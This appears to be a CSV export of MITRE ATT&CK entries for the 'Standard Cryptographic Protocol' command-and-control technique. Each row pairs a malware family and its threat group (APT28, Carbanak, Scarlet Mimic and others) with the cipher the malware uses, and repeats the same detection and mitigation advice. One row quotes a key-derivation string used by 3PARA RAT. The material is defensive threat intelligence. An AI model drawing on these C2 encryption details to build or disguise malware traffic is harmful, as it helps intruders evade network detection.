520,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Software/S0066|3PARA RAT]] command and control commands are encrypted within the HTTP C2 channel using the DES algorithm in CBC mode with a key derived from the MD5 hash of the string HYF54&%9&jkMCXuiS.[[CiteRef::CrowdStrike Putter Panda]]'],['Putter Panda'],"['Putter Panda', 'APT2', 'MSUpdater']",['G0024'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: 3PARA RAT,['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
521,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Software/S0012|PoisonIvy]] uses the Camellia cipher to encrypt communications.[[CiteRef::FireEye Poison Ivy]]'],['PittyTiger'],['PittyTiger'],['G0011'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PoisonIvy, Poison Ivy",['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
522,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Software/S0030|Carbanak]] encrypts the message body of HTTP traffic with RC2 and Base64 encoding.[[CiteRef::Kaspersky Carbanak]]'],['Carbanak'],"['Carbanak', 'Anunak']",['G0008'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Carbanak, Anunak",['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
523,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Software/S0030|Carbanak]] encrypts the message body of HTTP traffic with RC2 and Base64 encoding.[[CiteRef::Kaspersky Carbanak]]'],['FIN7'],['FIN7'],['G0046'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Carbanak, Anunak",['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
524,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']","[""[[Software/S0125|Remsec]]'s network loader encrypts C2 traffic with RSA and RC6.[[CiteRef::Symantec Remsec IOCs]]""]",['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Remsec, Backdoor.Remsec, ProjectSauron",['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
525,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Software/S0012|PoisonIvy]] uses the Camellia cipher to encrypt communications.[[CiteRef::FireEye Poison Ivy]]'],['Moafee'],['Moafee'],['G0002'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PoisonIvy, Poison Ivy",['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
526,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']","['[[Group/G0005|APT12]] has used the [[Software/S0003|RIPTIDE]] RAT, which communicates over HTTP with a payload encrypted with RC4.[[CiteRef::Moran 2014]]']",['APT12'],"['APT12', 'IXESHE', 'DynCalc', 'Numbered Panda']",['G0005'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: RIPTIDE,['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
527,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Software/S0012|PoisonIvy]] uses the Camellia cipher to encrypt communications.[[CiteRef::FireEye Poison Ivy]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PoisonIvy, Poison Ivy",['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
528,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Software/S0023|CHOPSTICK]] encrypts C2 communications with RC4 as well as TLS.[[CiteRef::ESET Sednit Part 2]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: CHOPSTICK, SPLM, ...",['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
529,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['A variant of [[Software/S0045|ADVSTORESHELL]] encrypts some C2 with 3DES and RSA.[[CiteRef::Bitdefender APT28 Dec 2015]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: ADVSTORESHELL, NETUI, ...",['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
530,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Software/S0117|XTunnel]] uses SSL/TLS and RC4 to encrypt traffic.[[CiteRef::Invincea XTunnel]][[CiteRef::ESET Sednit Part 2]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: XTunnel, X-Tunnel, XAPS",['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
531,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['Some variants of [[Software/S0076|FakeM]] use RC4 to encrypt C2 traffic.[[CiteRef::Scarlet Mimic Jan 2016]]'],['Scarlet Mimic'],['Scarlet Mimic'],['G0029'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: FakeM,['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
532,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Software/S0077|CallMe]] uses AES to encrypt C2 traffic.[[CiteRef::Scarlet Mimic Jan 2016]]'],['Scarlet Mimic'],['Scarlet Mimic'],['G0029'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: CallMe,['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
533,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Software/S0079|MobileOrder]] uses AES to encrypt C2 communications.[[CiteRef::Scarlet Mimic Jan 2016]]'],['Scarlet Mimic'],['Scarlet Mimic'],['G0029'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: MobileOrder,['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
534,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Software/S0012|PoisonIvy]] uses the Camellia cipher to encrypt communications.[[CiteRef::FireEye Poison Ivy]]'],['DragonOK'],['DragonOK'],['G0017'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PoisonIvy, Poison Ivy",['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
535,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']",['[[Software/S0081|Elise]] encrypts exfiltrated data with RC4.[[CiteRef::Lotus Blossom Jun 2015]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Elise, BKDR_ESILE, Page",['Command and Control'],['Technique/T1032'],['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
